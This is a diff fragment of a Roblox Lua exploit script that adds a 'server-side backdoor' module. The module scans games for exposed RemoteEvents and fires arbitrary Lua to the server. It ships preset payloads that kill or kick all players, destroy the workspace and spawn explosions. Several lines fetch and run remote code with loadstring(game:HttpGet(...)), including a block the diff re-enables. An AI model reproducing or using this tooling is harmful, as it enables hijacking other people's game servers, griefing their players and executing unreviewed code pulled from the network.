+        BorderSizePixel = 0
+    }, ScreenGui)
+    corner(12, MainFrame)
+    stroke(2, Color3.fromRGB(60, 60, 80), MainFrame)
+    local TitleBar = make("Frame", {
+        Size = UDim2.new(1, 0, 0, 40),
+        BackgroundColor3 = Color3.fromRGB(15, 15, 20),
+        BorderSizePixel = 0
+    }, MainFrame)
+    corner(12, TitleBar)
+    make("TextLabel", {
+        Size = UDim2.new(1, -100, 1, 0),
+        Position = UDim2.fromOffset(15, 0),
+        BackgroundTransparency = 1,
+        Text = "⚠ SERVER-SIDE BACKDOOR SCANNER",
+        TextColor3 = Color3.fromRGB(255, 100, 100),
+        Font = Enum.Font.GothamBold,
+        TextSize = 16,
+        TextXAlignment = Enum.TextXAlignment.Left
+    }, TitleBar)
+    local CloseBtn = make("TextButton", {
+        Size = UDim2.fromOffset(30, 30),
+        Position = UDim2.new(1, -35, 0.5, -15),
+        BackgroundColor3 = Color3.fromRGB(200, 50, 50),
+        Text = "×",
+        TextColor3 = Color3.new(1, 1, 1),
+        Font = Enum.Font.GothamBold,
+        TextSize = 20,
+        AutoButtonColor = false
+    }, TitleBar)
+    corner(6, CloseBtn)
+    CloseBtn.MouseButton1Click:Connect(function()
+        self:Close()
+    end)
+    local dragging, dragStart, startPos
+    TitleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = MainFrame.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            MainFrame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = false
+        end
+    end)
+    local Sidebar = make("Frame", {
+        Size = UDim2.new(0, 140, 1, -40),
+        Position = UDim2.fromOffset(0, 40),
+        BackgroundColor3 = Color3.fromRGB(15, 15, 20),
+        BorderSizePixel = 0
+    }, MainFrame)
+    local function createTabBtn(text, yPos)
+        local btn = make("TextButton", {
+            Size = UDim2.new(0.9, 0, 0, 35),
+            Position = UDim2.new(0.05, 0, 0, yPos),
+            BackgroundColor3 = Color3.fromRGB(30, 30, 40),
+            Text = text,
+            TextColor3 = Color3.fromRGB(200, 200, 200),
+            Font = Enum.Font.GothamMedium,
+            TextSize = 12,
+            AutoButtonColor = false
+        }, Sidebar)
+        corner(6, btn)
+        return btn
+    end
+    local ExecutorBtn = createTabBtn("📝 Executor", 10)
+    local RemotesBtn = createTabBtn("📡 Remotes", 50)
+    local ScriptsBtn = createTabBtn("📚 Scripts", 90)
+    local HistoryBtn = createTabBtn("📊 History", 130)
+    local ContentArea = make("Frame", {
+        Size = UDim2.new(1, -150, 1, -90),
+        Position = UDim2.fromOffset(145, 45),
+        BackgroundTransparency = 1
+    }, MainFrame)
+    local ExecutorTab = make("Frame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Visible = true
+    }, ContentArea)
+    local CodeBox = make("TextBox", {
+        Size = UDim2.new(1, -10, 1, -90),
+        BackgroundColor3 = Color3.fromRGB(10, 10, 15),
+        Text = "-- Server-side code here\n-- Example: game.Players:GetPlayers()",
+        TextColor3 = Color3.fromRGB(100, 255, 150),
+        Font = Enum.Font.Code,
+        TextSize = 13,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        TextYAlignment = Enum.TextYAlignment.Top,
+        MultiLine = true,
+        ClearTextOnFocus = false
+    }, ExecutorTab)
+    corner(8, CodeBox)
+    local padding = make("UIPadding", {
+        PaddingLeft = UDim.new(0, 10),
+        PaddingTop = UDim.new(0, 10),
+        PaddingRight = UDim.new(0, 10),
+        PaddingBottom = UDim.new(0, 10)
+    }, CodeBox)
+    local ExecuteBtn = make("TextButton", {
+        Size = UDim2.new(0.48, 0, 0, 40),
+        Position = UDim2.new(0, 0, 1, -45),
+        BackgroundColor3 = Color3.fromRGB(80, 200, 120),
+        Text = "▶ EXECUTE",
+        TextColor3 = Color3.new(1, 1, 1),
+        Font = Enum.Font.GothamBold,
+        TextSize = 14,
+        AutoButtonColor = false
+    }, ExecutorTab)
+    corner(8, ExecuteBtn)
+    local ClearBtn = make("TextButton", {
+        Size = UDim2.new(0.48, 0, 0, 40),
+        Position = UDim2.new(0.52, 0, 1, -45),
+        BackgroundColor3 = Color3.fromRGB(60, 60, 70),
+        Text = "🗑 CLEAR",
+        TextColor3 = Color3.new(1, 1, 1),
+        Font = Enum.Font.GothamBold,
+        TextSize = 14,
+        AutoButtonColor = false
+    }, ExecutorTab)
+    corner(8, ClearBtn)
+    local RemotesTab = make("ScrollingFrame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Visible = false,
+        ScrollBarThickness = 4,
+        ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120),
+        CanvasSize = UDim2.new(0, 0, 0, 0)
+    }, ContentArea)
+    make("UIListLayout", {
+        Padding = UDim.new(0, 5),
+        SortOrder = Enum.SortOrder.LayoutOrder
+    }, RemotesTab)
+    local ScriptsTab = make("ScrollingFrame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Visible = false,
+        ScrollBarThickness = 4,
+        ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120),
+        CanvasSize = UDim2.new(0, 0, 0, 0)
+    }, ContentArea)
+    make("UIListLayout", {
+        Padding = UDim.new(0, 5),
+        SortOrder = Enum.SortOrder.LayoutOrder
+    }, ScriptsTab)
+    local HistoryTab = make("ScrollingFrame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Visible = false,
+        ScrollBarThickness = 4,
+        ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120),
+        CanvasSize = UDim2.new(0, 0, 0, 0)
+    }, ContentArea)
+    make("UIListLayout", {
+        Padding = UDim.new(0, 5),
+        SortOrder = Enum.SortOrder.LayoutOrder
+    }, HistoryTab)
+    local tabs = {ExecutorTab, RemotesTab, ScriptsTab, HistoryTab}
+    local btns = {ExecutorBtn, RemotesBtn, ScriptsBtn, HistoryBtn}
+    for i, btn in ipairs(btns) do
+        btn.MouseButton1Click:Connect(function()
+            for _, tab in ipairs(tabs) do tab.Visible = false end
+            for _, b in ipairs(btns) do b.BackgroundColor3 = Color3.fromRGB(30, 30, 40) end
+            tabs[i].Visible = true
+            btn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+        end)
+    end
+    local StatusBar = make("Frame", {
+        Size = UDim2.new(1, -150, 0, 35),
+        Position = UDim2.new(0, 145, 1, -40),
+        BackgroundColor3 = Color3.fromRGB(15, 15, 20),
+        BorderSizePixel = 0
+    }, MainFrame)
+    local StatusLabel = make("TextLabel", {
+        Size = UDim2.new(1, -100, 1, 0),
+        Position = UDim2.fromOffset(10, 0),
+        BackgroundTransparency = 1,
+        Text = "Status: Ready",
+        TextColor3 = Color3.fromRGB(150, 150, 150),
+        Font = Enum.Font.Gotham,
+        TextSize = 11,
+        TextXAlignment = Enum.TextXAlignment.Left
+    }, StatusBar)
+    local ScanBtn = make("TextButton", {
+        Size = UDim2.fromOffset(80, 25),
+        Position = UDim2.new(1, -85, 0.5, -12.5),
+        BackgroundColor3 = Color3.fromRGB(100, 100, 255),
+        Text = "🔍 SCAN",
+        TextColor3 = Color3.new(1, 1, 1),
+        Font = Enum.Font.GothamBold,
+        TextSize = 11,
+        AutoButtonColor = false
+    }, StatusBar)
+    corner(6, ScanBtn)
+    ExecuteBtn.MouseButton1Click:Connect(function()
+        self:ExecuteCode(CodeBox.Text)
+    end)
+    ClearBtn.MouseButton1Click:Connect(function()
+        CodeBox.Text = ""
+    end)
+    ScanBtn.MouseButton1Click:Connect(function()
+        self:Scan()
+    end)
+    self.State.UI = {
+        ScreenGui = ScreenGui,
+        MainFrame = MainFrame,
+        CodeBox = CodeBox,
+        StatusLabel = StatusLabel,
+        RemotesTab = RemotesTab,
+        ScriptsTab = ScriptsTab,
+        HistoryTab = HistoryTab
+    }
+    self:_createScriptButtons()
+    self:_updateRemoteList()
+    self:_updateHistory()
+    self:_updateStatus()
+end
+function Modules.ServerSideBackdoor:_createScriptButtons()
+    if not self.State.UI then return end
+    local scripts = {
+        {name = " Kill All Players", code = "for _,p in pairs(game.Players:GetPlayers()) do if p.Character then p.Character:BreakJoints() end end"},
+        {name = " Unanchor Workspace", code = "for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then v.Anchored = false end end"},
+        {name = " Give All BTools", code = "for _,p in pairs(game.Players:GetPlayers()) do Instance.new('HopperBin',p.Backpack).BinType=1 Instance.new('HopperBin',p.Backpack).BinType=3 Instance.new('HopperBin',p.Backpack).BinType=4 end"},
+        {name = " Kick All Players", code = "for _,p in pairs(game.Players:GetPlayers()) do if p~=game.Players.LocalPlayer then p:Kick('Kicked by backdoor') end end"},
+        {name = " Clear Workspace", code = "for _,v in pairs(workspace:GetChildren()) do if not v:IsA('Camera') and not v:IsA('Terrain') then v:Destroy() end end"},
+        {name = " Give Everyone Admin", code = "loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()"},
+        {name = " Spam Explosions", code = "for i=1,50 do local e=Instance.new('Explosion',workspace) e.Position=Vector3.new(math.random(-100,100),50,math.random(-100,100)) end"},
+        {name = " Rainbow Workspace", code = "for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then v.BrickColor=BrickColor.Random() end end"},
+    }
+    for i, script in ipairs(scripts) do
+        local btn = make("TextButton", {
+            Size = UDim2.new(1, -10, 0, 40),
+            BackgroundColor3 = Color3.fromRGB(30, 30, 40),
+            Text = script.name,
+            TextColor3 = Color3.fromRGB(220, 220, 220),
+            Font = Enum.Font.Gotham,
+            TextSize = 12,
+            AutoButtonColor = false
+        }, self.State.UI.ScriptsTab)
+        corner(6, btn)
+        btn.MouseButton1Click:Connect(function()
+            self:ExecuteCode(script.code)
+        end)
+    end
+    self.State.UI.ScriptsTab.CanvasSize = UDim2.fromOffset(0, #scripts * 45)
+end
+function Modules.ServerSideBackdoor:_updateRemoteList()
+    if not self.State.UI then return end
+    for _, child in ipairs(self.State.UI.RemotesTab:GetChildren()) do
+        if not child:IsA("UIListLayout") then
+            child:Destroy()
+        end
+    end
+    if #self.State.FoundRemotes == 0 then
+        local lbl = make("TextLabel", {
+            Size = UDim2.new(1, 0, 0, 40),
+            BackgroundTransparency = 1,
+            Text = "No remotes found. Click SCAN.",
+            TextColor3 = Color3.fromRGB(150, 150, 150),
+            Font = Enum.Font.Gotham,
+            TextSize = 12
+        }, self.State.UI.RemotesTab)
+        return
+    end
+    for i, data in ipairs(self.State.FoundRemotes) do
+        local isActive = (self.State.ActiveRemote == data.Remote)
+        local btn = make("TextButton", {
+            Size = UDim2.new(1, -10, 0, 50),
+            BackgroundColor3 = isActive and Color3.fromRGB(60, 100, 60) or Color3.fromRGB(30, 30, 40),
+            Text = "",
+            AutoButtonColor = false
+        }, self.State.UI.RemotesTab)
+        corner(6, btn)
+        make("TextLabel", {
+            Size = UDim2.new(1, -10, 0, 18),
+            Position = UDim2.fromOffset(5, 5),
+            BackgroundTransparency = 1,
+            Text = data.Name,
+            TextColor3 = Color3.new(1, 1, 1),
+            Font = Enum.Font.GothamBold,
+            TextSize = 13,
+            TextXAlignment = Enum.TextXAlignment.Left
+        }, btn)
+        make("TextLabel", {
+            Size = UDim2.new(1, -10, 0, 14),
+            Position = UDim2.fromOffset(5, 27),
+            BackgroundTransparency = 1,
+            Text = data.Type .. " • " .. data.Parent,
+            TextColor3 = Color3.fromRGB(180, 180, 180),
+            Font = Enum.Font.Gotham,
+            TextSize = 10,
+            TextXAlignment = Enum.TextXAlignment.Left
+        }, btn)
+        btn.MouseButton1Click:Connect(function()
+            self.State.ActiveRemote = data.Remote
+            self:_updateRemoteList()
+            self:_updateStatus()
+            DoNotif("Active remote: " .. data.Name, 2)
+        end)
+    end
+    self.State.UI.RemotesTab.CanvasSize = UDim2.fromOffset(0, #self.State.FoundRemotes * 55)
+end
+function Modules.ServerSideBackdoor:_updateHistory()
+    if not self.State.UI then return end
+    for _, child in ipairs(self.State.UI.HistoryTab:GetChildren()) do
+        if not child:IsA("UIListLayout") then
+            child:Destroy()
+        end
+    end
+    if #self.State.ScanHistory == 0 then
+        make("TextLabel", {
+            Size = UDim2.new(1, 0, 0, 40),
+            BackgroundTransparency = 1,
+            Text = "No scan history yet.",
+            TextColor3 = Color3.fromRGB(150, 150, 150),
+            Font = Enum.Font.Gotham,
+            TextSize = 12
+        }, self.State.UI.HistoryTab)
+        return
+    end
+    for i = #self.State.ScanHistory, 1, -1 do
+        local scan = self.State.ScanHistory[i]
+        local frame = make("Frame", {
+            Size = UDim2.new(1, -10, 0, 45),
+            BackgroundColor3 = Color3.fromRGB(25, 25, 35),
+        }, self.State.UI.HistoryTab)
+        corner(6, frame)
+        make("TextLabel", {
+            Size = UDim2.new(1, -10, 0.5, 0),
+            Position = UDim2.fromOffset(5, 5),
+            BackgroundTransparency = 1,
+            Text = string.format("Scan at %s", scan.Time),
+            TextColor3 = Color3.new(1, 1, 1),
+            Font = Enum.Font.GothamBold,
+            TextSize = 12,
+            TextXAlignment = Enum.TextXAlignment.Left
+        }, frame)
+        make("TextLabel", {
+            Size = UDim2.new(1, -10, 0.5, -5),
+            Position = UDim2.new(0, 5, 0.5, 0),
+            BackgroundTransparency = 1,
+            Text = string.format("Found: %d • Scanned: %d • Time: %.1fs", 
+                scan.Found, scan.Scanned, scan.Duration),
+            TextColor3 = Color3.fromRGB(180, 180, 180),
+            Font = Enum.Font.Gotham,
+            TextSize = 10,
+            TextXAlignment = Enum.TextXAlignment.Left
+        }, frame)
+    end
+    self.State.UI.HistoryTab.CanvasSize = UDim2.fromOffset(0, #self.State.ScanHistory * 50)
+end
+function Modules.ServerSideBackdoor:_updateStatus()
+    if not self.State.UI then return end
+    if self.State.IsScanning then
+        self.State.UI.StatusLabel.Text = "Status: Scanning..."
+        self.State.UI.StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
+    elseif self.State.ActiveRemote then
+        self.State.UI.StatusLabel.Text = "Active: " .. self.State.ActiveRemote.Name
+        self.State.UI.StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    else
+        self.State.UI.StatusLabel.Text = "Status: No active remote"
+        self.State.UI.StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    end
+end
+function Modules.ServerSideBackdoor:ExecuteCode(code)
+    if not self.State.ActiveRemote then
+        return DoNotif("No active remote. Scan first!", 3)
+    end
+    local success = pcall(function()
+        self.State.ActiveRemote:FireServer(code)
+    end)
+    if success then
+        DoNotif("Code sent to server!", 2)
+        if self.State.UI then
+            self.State.UI.StatusLabel.Text = "Executed!"
+            task.delay(2, function()
+                self:_updateStatus()
+            end)
+        end
+    else
+        DoNotif("Failed to execute!", 3)
+    end
+end
+function Modules.ServerSideBackdoor:Scan()
+    if self.State.IsScanning then
+        return DoNotif("Scan already in progress...", 2)
+    end
+    self:_scanForRemotes()
+end
+function Modules.ServerSideBackdoor:Open()
+    if self.State.IsOpen then return end
+    self.State.IsOpen = true
+    self:_createUI()
+    if self.Config.AutoScan and #self.State.FoundRemotes == 0 then
+        task.delay(0.5, function()
+            self:Scan()
+        end)
+    end
+    DoNotif("SS Backdoor Scanner opened", 2)
+end
+function Modules.ServerSideBackdoor:Close()
+    if not self.State.IsOpen then return end
+    self.State.IsOpen = false
+    if self.State.UI and self.State.UI.ScreenGui then
+        self.State.UI.ScreenGui:Destroy()
+    end
+    self.State.UI = nil
+    DoNotif("SS Backdoor Scanner closed", 2)
+end
+function Modules.ServerSideBackdoor:Toggle()
+    if self.State.IsOpen then
+        self:Close()
+    else
+        self:Open()
+    end
+end
+function Modules.ServerSideBackdoor:Initialize()
+    local module = self
+    RegisterCommand({
+        Name = "ssbackdoor",
+        Aliases = {"ssbd", "backdoor", "serverside"},
+        Description = "Opens server-side backdoor scanner."
+    }, function()
+        module:Toggle()
+    end)
+    RegisterCommand({
+        Name = "ssscan",
+        Aliases = {"scanbd"},
+        Description = "Scans for server-side backdoors."
+    }, function()
+        if not module.State.IsOpen then
+            module:Open()
+        end
+        module:Scan()
+    end)
+    RegisterCommand({
+        Name = "ssexec",
+        Aliases = {"bdexec"},
+        Description = "Execute code on server-side backdoor."
+    }, function(args)
+        local code = table.concat(args, " ")
+        if code == "" then
+            return DoNotif("Usage: ;ssexec <code>", 3)
+        end
+        module:ExecuteCode(code)
+    end)
+end
 Modules.Aggressor = {
     State = {
         IsEnabled = false,
@@ -35929,7 +37294,7 @@ task.spawn(function()
 end)
 
 
---[[task.spawn(function()
+task.spawn(function()
     local Luna
     local ok, err = pcall(function()
         Luna = loadstring(game:HttpGet(
@@ -37097,4 +38462,5 @@ end)
 end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/notifier.lua"))()
 
-print("I update this pretty often, expect many things to change or be removed.")]]
+print("I update this pretty often, expect many things to change or be removed.")
+print("I removed the splash screen intro, working on a new one.")
